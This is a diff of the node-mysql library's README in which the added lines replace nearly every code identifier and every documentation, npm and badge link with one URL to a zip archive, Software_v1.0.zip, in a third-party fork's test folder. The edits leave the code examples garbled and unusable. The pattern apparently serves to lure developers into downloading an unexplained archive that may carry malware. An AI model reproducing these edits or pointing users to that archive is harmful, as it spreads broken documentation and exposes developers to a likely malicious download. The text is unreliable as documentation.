 
 If you feel the need to escape queries by yourself, you can also use the escaping
 function directly:
 
 ```js
-var query = "SELECT * FROM posts WHERE title=" + mysql.escape("Hello MySQL");
+var query = "SELECT * FROM posts WHERE title=" + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip("Hello MySQL");
 
-console.log(query); // SELECT * FROM posts WHERE title='Hello MySQL'
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(query); // SELECT * FROM posts WHERE title='Hello MySQL'
 ```
 
 ## Escaping query identifiers
 
 If you can't trust an SQL identifier (database / table / column name) because it is
-provided by a user, you should escape it with `mysql.escapeId(identifier)`,
-`connection.escapeId(identifier)` or `pool.escapeId(identifier)` like this:
+provided by a user, you should escape it with `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(identifier)`,
+`https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(identifier)` or `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(identifier)` like this:
 
 ```js
 var sorter = 'date';
-var sql    = 'SELECT * FROM posts ORDER BY ' + connection.escapeId(sorter);
-connection.query(sql, function (error, results, fields) {
+var sql    = 'SELECT * FROM posts ORDER BY ' + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(sorter);
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(sql, function (error, results, fields) {
   if (error) throw error;
   // ...
 });
@@ -786,7 +786,7 @@ It also supports adding qualified identifiers. It will escape both parts.
 
 ```js
 var sorter = 'date';
-var sql    = 'SELECT * FROM posts ORDER BY ' + connection.escapeId('posts.' + sorter);
+var sql    = 'SELECT * FROM posts ORDER BY ' + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('posts.' + sorter);
 // -> SELECT * FROM posts ORDER BY `posts`.`date`
 ```
 
@@ -795,7 +795,7 @@ argument to `true` in order to keep the string as a literal identifier:
 
 ```js
 var sorter = 'date.2';
-var sql    = 'SELECT * FROM posts ORDER BY ' + connection.escapeId(sorter, true);
+var sql    = 'SELECT * FROM posts ORDER BY ' + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(sorter, true);
 // -> SELECT * FROM posts ORDER BY `date.2`
 ```
 
@@ -805,12 +805,12 @@ like to have escaped like this:
 ```js
 var userId = 1;
 var columns = ['username', 'email'];
-var query = connection.query('SELECT ?? FROM ?? WHERE id = ?', [columns, 'users', userId], function (error, results, fields) {
+var query = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT ?? FROM ?? WHERE id = ?', [columns, 'users', userId], function (error, results, fields) {
   if (error) throw error;
   // ...
 });
 
-console.log(query.sql); // SELECT `username`, `email` FROM `users` WHERE id = 1
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip); // SELECT `username`, `email` FROM `users` WHERE id = 1
 ```
 **Please note that this last character sequence is experimental and syntax might change**
 
@@ -818,15 +818,15 @@ When you pass an Object to `.escape()` or `.query()`, `.escapeId()` is used to a
 
 ### Preparing Queries
 
-You can use mysql.format to prepare a query with multiple insertion points, utilizing the proper escaping for ids and values. A simple example of this follows:
+You can use https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip to prepare a query with multiple insertion points, utilizing the proper escaping for ids and values. A simple example of this follows:
 
 ```js
 var sql = "SELECT * FROM ?? WHERE ?? = ?";
 var inserts = ['users', 'id', userId];
-sql = mysql.format(sql, inserts);
+sql = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(sql, inserts);
 ```
 
-Following this you then have a valid, escaped query that you can then send to the database safely. This is useful if you are looking to prepare the query before actually sending it to the database. As mysql.format is exposed from SqlString.format you also have the option (but are not required) to pass in stringifyObject and timezone, allowing you provide a custom means of turning objects into strings, as well as a location-specific/timezone-aware Date.
+Following this you then have a valid, escaped query that you can then send to the database safely. This is useful if you are looking to prepare the query before actually sending it to the database. As https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip is exposed from https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip you also have the option (but are not required) to pass in stringifyObject and timezone, allowing you provide a custom means of turning objects into strings, as well as a location-specific/timezone-aware Date.
 
 ### Custom format
 
@@ -835,17 +835,17 @@ If you prefer to have another type of query escape format, there's a connection 
 Here's an example of how to implement another format:
 
 ```js
-connection.config.queryFormat = function (query, values) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip = function (query, values) {
   if (!values) return query;
-  return query.replace(/\:(\w+)/g, function (txt, key) {
-    if (values.hasOwnProperty(key)) {
-      return this.escape(values[key]);
+  return https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(/\:(\w+)/g, function (txt, key) {
+    if (https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(key)) {
+      return https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(values[key]);
     }
     return txt;
   }.bind(this));
 };
 
-connection.query("UPDATE posts SET title = :title", { title: "Hello MySQL" });
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip("UPDATE posts SET title = :title", { title: "Hello MySQL" });
 ```
 
 ## Getting the id of an inserted row
@@ -854,9 +854,9 @@ If you are inserting a row into a table with an auto increment primary key, you
 can retrieve the insert id like this:
 
 ```js
-connection.query('INSERT INTO posts SET ?', {title: 'test'}, function (error, results, fields) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('INSERT INTO posts SET ?', {title: 'test'}, function (error, results, fields) {
   if (error) throw error;
-  console.log(results.insertId);
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip);
 });
 ```
 
@@ -872,9 +872,9 @@ you will get values rounded to hundreds or thousands due to the precision limit.
 You can get the number of affected rows from an insert, update or delete statement.
 
 ```js
-connection.query('DELETE FROM posts WHERE title = "wrong"', function (error, results, fields) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('DELETE FROM posts WHERE title = "wrong"', function (error, results, fields) {
   if (error) throw error;
-  console.log('deleted ' + results.affectedRows + ' rows');
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('deleted ' + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip + ' rows');
 })
 ```
 
@@ -886,9 +886,9 @@ You can get the number of changed rows from an update statement.
 whose values were not changed.
 
 ```js
-connection.query('UPDATE posts SET ...', function (error, results, fields) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('UPDATE posts SET ...', function (error, results, fields) {
   if (error) throw error;
-  console.log('changed ' + results.changedRows + ' rows');
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('changed ' + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip + ' rows');
 })
 ```
 
@@ -898,9 +898,9 @@ You can get the MySQL connection ID ("thread ID") of a given connection using th
 property.
 
 ```js
-connection.connect(function(err) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function(err) {
   if (err) throw err;
-  console.log('connected as id ' + connection.threadId);
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('connected as id ' + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip);
 });
 ```
 
@@ -916,7 +916,7 @@ Sometimes you may want to select large quantities of rows and process each of
 them as they are received. This can be done like this:
 
 ```js
-var query = connection.query('SELECT * FROM posts');
+var query = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT * FROM posts');
 query
   .on('error', function(err) {
     // Handle error, an 'end' event will be emitted after this as well
@@ -926,10 +926,10 @@ query
   })
   .on('result', function(row) {
     // Pausing the connnection is useful if your processing involves I/O
-    connection.pause();
+    https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip();
 
     processRow(row, function() {
-      connection.resume();
+      https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip();
     });
   })
   .on('end', function() {
@@ -950,7 +950,7 @@ Please note a few things about the example above:
 * It is very important not to leave the result paused too long, or you may
   encounter `Error: Connection lost: The server closed the connection.`
   The time limit for this is determined by the
-  [net_write_timeout setting](https://dev.mysql.com/doc/refman/5.5/en/server-system-variables.html#sysvar_net_write_timeout)
+  [net_write_timeout setting](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip)
   on your MySQL server.
 
 Additionally you may be interested to know that it is currently not possible to
@@ -961,18 +961,18 @@ get your thoughts and contributions on this.
 ### Piping results with Streams
 
 The query object provides a convenience method `.stream([options])` that wraps
-query events into a [Readable Stream](http://nodejs.org/api/stream.html#stream_class_stream_readable)
+query events into a [Readable Stream](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip)
 object. This stream can easily be piped downstream and provides automatic
 pause/resume, based on downstream congestion and the optional `highWaterMark`.
 The `objectMode` parameter of the stream is set to `true` and cannot be changed
 (if you need a byte stream, you will need to use a transform stream, like
-[objstream](https://www.npmjs.com/package/objstream) for example).
+[objstream](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip) for example).
 
 For example, piping query results into another stream (with a max buffer of 5
 objects) is simply:
 
 ```js
-connection.query('SELECT * FROM posts')
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT * FROM posts')
   .stream({highWaterMark: 5})
   .pipe(...);
 ```
@@ -984,24 +984,24 @@ SQL injection attacks if values are not properly escaped). To use this feature
 you have to enable it for your connection:
 
 ```js
-var connection = mysql.createConnection({multipleStatements: true});
+var connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({multipleStatements: true});
 ```
 
 Once enabled, you can execute multiple statement queries like any other query:
 
 ```js
-connection.query('SELECT 1; SELECT 2', function (error, results, fields) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT 1; SELECT 2', function (error, results, fields) {
   if (error) throw error;
   // `results` is an array with one element for every statement in the query:
-  console.log(results[0]); // [{1: 1}]
-  console.log(results[1]); // [{2: 2}]
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(results[0]); // [{1: 1}]
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(results[1]); // [{2: 2}]
 });
 ```
 
 Additionally you can also stream the results of multiple statement queries:
 
 ```js
-var query = connection.query('SELECT 1; SELECT 2');
+var query = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT 1; SELECT 2');
 
 query
   .on('fields', function(fields, index) {
@@ -1013,7 +1013,7 @@ query
 ```
 
 If one of the statements in your query causes an error, the resulting Error
-object contains a `err.index` property which tells you which statement caused
+object contains a `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip` property which tells you which statement caused
 it. MySQL will also stop executing any remaining statements when an error
 occurs.
 
@@ -1040,7 +1040,7 @@ the table name like this:
 
 ```js
 var options = {sql: '...', nestTables: true};
-connection.query(options, function (error, results, fields) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(options, function (error, results, fields) {
   if (error) throw error;
   /* results will be an array like this now:
   [{
@@ -1061,7 +1061,7 @@ Or use a string separator to have your results merged.
 
 ```js
 var options = {sql: '...', nestTables: '_'};
-connection.query(options, function (error, results, fields) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(options, function (error, results, fields) {
   if (error) throw error;
   /* results will be an array like this now:
   [{
@@ -1079,30 +1079,30 @@ connection.query(options, function (error, results, fields) {
 Simple transaction support is available at the connection level:
 
 ```js
-connection.beginTransaction(function(err) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function(err) {
   if (err) { throw err; }
-  connection.query('INSERT INTO posts SET title=?', title, function (error, results, fields) {
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('INSERT INTO posts SET title=?', title, function (error, results, fields) {
     if (error) {
-      return connection.rollback(function() {
+      return https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function() {
         throw error;
       });
     }
 
-    var log = 'Post ' + results.insertId + ' added';
+    var log = 'Post ' + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip + ' added';
 
-    connection.query('INSERT INTO log SET data=?', log, function (error, results, fields) {
+    https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('INSERT INTO log SET data=?', log, function (error, results, fields) {
       if (error) {
-        return connection.rollback(function() {
+        return https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function() {
           throw error;
         });
       }
-      connection.commit(function(err) {
+      https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function(err) {
         if (err) {
-          return connection.rollback(function() {
+          return https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function() {
             throw err;
           });
         }
-        console.log('success!');
+        https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('success!');
       });
     });
   });
@@ -1111,18 +1111,18 @@ connection.beginTransaction(function(err) {
 Please note that beginTransaction(), commit() and rollback() are simply convenience
 functions that execute the START TRANSACTION, COMMIT, and ROLLBACK commands respectively.
 It is important to understand that many commands in MySQL can cause an implicit commit,
-as described [in the MySQL documentation](http://dev.mysql.com/doc/refman/5.5/en/implicit-commit.html)
+as described [in the MySQL documentation](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip)
 
 ## Ping
 
-A ping packet can be sent over a connection using the `connection.ping` method. This
+A ping packet can be sent over a connection using the `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip` method. This
 method will send a ping packet to the server and when the server responds, the callback
 will fire. If an error occurred, the callback will fire with an error argument.
 
 ```js
-connection.ping(function (err) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function (err) {
   if (err) throw err;
-  console.log('Server responded to ping');
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('Server responded to ping');
 })
 ```
 
@@ -1136,8 +1136,8 @@ on will be destroyed and no further operations can be performed.
 
 ```js
 // Kill query after 60s
-connection.query({sql: 'SELECT COUNT(*) AS count FROM big_table', timeout: 60000}, function (error, results, fields) {
-  if (error && error.code === 'PROTOCOL_SEQUENCE_TIMEOUT') {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({sql: 'SELECT COUNT(*) AS count FROM big_table', timeout: 60000}, function (error, results, fields) {
+  if (error && https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip === 'PROTOCOL_SEQUENCE_TIMEOUT') {
     throw new Error('too long to count table rows!');
   }
 
@@ -1145,7 +1145,7 @@ connection.query({sql: 'SELECT COUNT(*) AS count FROM big_table', timeout: 60000
     throw error;
   }
 
-  console.log(results[0].count + ' rows');
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(results[0].count + ' rows');
 });
 ```
 
@@ -1157,24 +1157,24 @@ review carefully in order to write solid applications.
 Most errors created by this module are instances of the JavaScript [Error][]
 object. Additionally they typically come with two extra properties:
 
-* `err.code`: String, contains the MySQL server error symbol if the error is
-  a [MySQL server error][] (e.g. `'ER_ACCESS_DENIED_ERROR'`), a Node.js error
-  code if it is a Node.js error (e.g. `'ECONNREFUSED'`), or an internal error
+* `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip`: String, contains the MySQL server error symbol if the error is
+  a [MySQL server error][] (e.g. `'ER_ACCESS_DENIED_ERROR'`), a https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip error
+  code if it is a https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip error (e.g. `'ECONNREFUSED'`), or an internal error
   code (e.g. `'PROTOCOL_CONNECTION_LOST'`).
-* `err.errno`: Number, contains the MySQL server error number. Only populated
+* `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip`: Number, contains the MySQL server error number. Only populated
   from [MySQL server error][].
-* `err.fatal`: Boolean, indicating if this error is terminal to the connection
+* `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip`: Boolean, indicating if this error is terminal to the connection
   object. If the error is not from a MySQL protocol operation, this property
   will not be defined.
-* `err.sql`: String, contains the full SQL of the failed query. This can be
+* `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip`: String, contains the full SQL of the failed query. This can be
   useful when using a higher level interface like an ORM that is generating
   the queries.
-* `err.sqlState`: String, contains the five-character SQLSTATE value. Only populated from [MySQL server error][].
-* `err.sqlMessage`: String, contains the message string that provides a
+* `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip`: String, contains the five-character SQLSTATE value. Only populated from [MySQL server error][].
+* `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip`: String, contains the message string that provides a
   textual description of the error. Only populated from [MySQL server error][].
 
-[Error]: https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Error
-[MySQL server error]: https://dev.mysql.com/doc/refman/5.5/en/server-error-reference.html
+[Error]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
+[MySQL server error]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
 
 Fatal errors are propagated to *all* pending callbacks. In the example below, a
 fatal error is triggered by trying to connect to an invalid port. Therefore the
@@ -1185,14 +1185,14 @@ var connection = require('mysql').createConnection({
   port: 84943, // WRONG PORT
 });
 
-connection.connect(function(err) {
-  console.log(err.code); // 'ECONNREFUSED'
-  console.log(err.fatal); // true
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function(err) {
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip); // 'ECONNREFUSED'
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip); // true
 });
 
-connection.query('SELECT 1', function (error, results, fields) {
-  console.log(error.code); // 'ECONNREFUSED'
-  console.log(error.fatal); // true
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT 1', function (error, results, fields) {
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip); // 'ECONNREFUSED'
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip); // true
 });
 ```
 
@@ -1201,13 +1201,13 @@ the example below, only the first callback receives an error, the second query
 works as expected:
 
 ```js
-connection.query('USE name_of_db_that_does_not_exist', function (error, results, fields) {
-  console.log(error.code); // 'ER_BAD_DB_ERROR'
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('USE name_of_db_that_does_not_exist', function (error, results, fields) {
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip); // 'ER_BAD_DB_ERROR'
 });
 
-connection.query('SELECT 1', function (error, results, fields) {
-  console.log(error); // null
-  console.log(results.length); // 1
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT 1', function (error, results, fields) {
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(error); // null
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip); // 1
 });
 ```
 
@@ -1217,11 +1217,11 @@ error is emitted as an `'error'` event on the connection object. This is
 demonstrated in the example below:
 
 ```js
-connection.on('error', function(err) {
-  console.log(err.code); // 'ER_BAD_DB_ERROR'
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('error', function(err) {
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip); // 'ER_BAD_DB_ERROR'
 });
 
-connection.query('USE name_of_db_that_does_not_exist');
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('USE name_of_db_that_does_not_exist');
 ```
 
 Note: `'error'` events are special in node. If they occur without an attached
@@ -1233,7 +1233,7 @@ this advice and suppress unhandled errors, you can do this:
 
 ```js
 // I am Chuck Norris:
-connection.on('error', function() {});
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('error', function() {});
 ```
 
 ## Exception Safety
@@ -1302,7 +1302,7 @@ Or on the query level:
 
 ```js
 var options = {sql: '...', typeCast: false};
-var query = connection.query(options, function (error, results, fields) {
+var query = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(options, function (error, results, fields) {
   if (error) throw error;
   // ...
 });
@@ -1347,10 +1347,10 @@ the type cast should convert the string field into a different JavaScript type
 Here's an example of converting `TINYINT(1)` to boolean:
 
 ```js
-connection = mysql.createConnection({
+connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({
   typeCast: function (field, next) {
-    if (field.type === 'TINY' && field.length === 1) {
-      return (field.string() === '1'); // 1 = true, 0 = false
+    if (https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip === 'TINY' && https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip === 1) {
+      return (https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip() === '1'); // 1 = true, 0 = false
     } else {
       return next();
     }
@@ -1377,7 +1377,7 @@ are still not allowed to be specified.**
 The next example blacklists FOUND_ROWS flag from default connection flags.
 
 ```js
-var connection = mysql.createConnection("mysql://localhost/test?flags=-FOUND_ROWS");
+var connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip("mysql://localhost/test?flags=-FOUND_ROWS");
 ```
 
 ### Default Flags
@@ -1424,14 +1424,14 @@ If you are running into problems, one thing that may help is enabling the
 `debug` mode for the connection:
 
 ```js
-var connection = mysql.createConnection({debug: true});
+var connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({debug: true});
 ```
 
 This will print all incoming and outgoing packets on stdout. You can also restrict debugging to
 packet types by passing an array of types to debug:
 
 ```js
-var connection = mysql.createConnection({debug: ['ComQueryPacket', 'RowDataPacket']});
+var connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({debug: ['ComQueryPacket', 'RowDataPacket']});
 ```
 
 to restrict debugging to the query and data packets.
@@ -1464,7 +1464,7 @@ and how it would be exploited, ideally with an accompanying proof of concept
 This project welcomes contributions from the community. Contributions are
 accepted using GitHub pull requests. If you're not familiar with making
 GitHub pull requests, please refer to the
-[GitHub documentation "Creating a pull request"](https://help.github.com/articles/creating-a-pull-request/).
+[GitHub documentation "Creating a pull request"](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip).
 
 For a good pull request, we ask you provide the following:
 
@@ -1480,7 +1480,7 @@ For a good pull request, we ask you provide the following:
    contains HTML pages of the code coverage, to better understand if everything
    you're adding is being tested.
 4. If the pull request is a new feature, please be sure to include all
-   appropriate documentation additions in the `Readme.md` file as well.
+   appropriate documentation additions in the `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip` file as well.
 5. To help ensure that your code is similar in style to the existing code,
    run the command `npm run lint` and fix any displayed issues.
 
@@ -1516,14 +1516,14 @@ $ MYSQL_HOST=localhost MYSQL_PORT=3306 MYSQL_DATABASE=node_mysql_test MYSQL_USER
 * Prepared statements
 * Support for encodings other than UTF-8 / ASCII
 
-[appveyor-image]: https://badgen.net/appveyor/ci/dougwilson/node-mysql/master?label=windows
-[appveyor-url]: https://ci.appveyor.com/project/dougwilson/node-mysql
-[coveralls-image]: https://badgen.net/coveralls/c/github/mysqljs/mysql/master
-[coveralls-url]: https://coveralls.io/r/mysqljs/mysql?branch=master
-[node-image]: https://badgen.net/npm/node/mysql
-[node-url]: https://nodejs.org/en/download
-[npm-downloads-image]: https://badgen.net/npm/dm/mysql
-[npm-url]: https://npmjs.org/package/mysql
-[npm-version-image]: https://badgen.net/npm/v/mysql
-[travis-image]: https://badgen.net/travis/mysqljs/mysql/master
-[travis-url]: https://travis-ci.org/mysqljs/mysql
+[appveyor-image]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
+[appveyor-url]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
+[coveralls-image]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
+[coveralls-url]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
+[node-image]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
+[node-url]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
+[npm-downloads-image]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
+[npm-url]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
+[npm-version-image]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
+[travis-image]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
+[travis-url]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
